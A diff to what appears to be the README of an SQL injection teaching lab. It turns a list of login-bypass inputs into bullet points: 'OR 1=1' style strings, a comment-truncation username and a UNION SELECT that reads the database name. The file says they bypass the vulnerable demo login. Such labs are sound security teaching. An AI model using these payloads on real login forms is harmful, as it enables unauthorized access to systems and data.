@@ -50,12 +50,12 @@ Password: admin123
 
 Test the following inputs in the **vulnerable login page**:
 
-Username: admin' #
-Username: admin' OR '1'='1
-Username: admin' OR 'a'='a
-Username: ' UNION SELECT null, null, database()--
-Username: ' OR ''='
-password:anythinng
+- Username: admin' #
+- Username: admin' OR '1'='1
+- Username: admin' OR 'a'='a
+- Username: ' UNION SELECT null, null, database()--
+- Username: ' OR ''='
+- password:anythinng
 
 
 - ✅ These inputs will **bypass** the login in the vulnerable system due to unsanitized SQL queries.
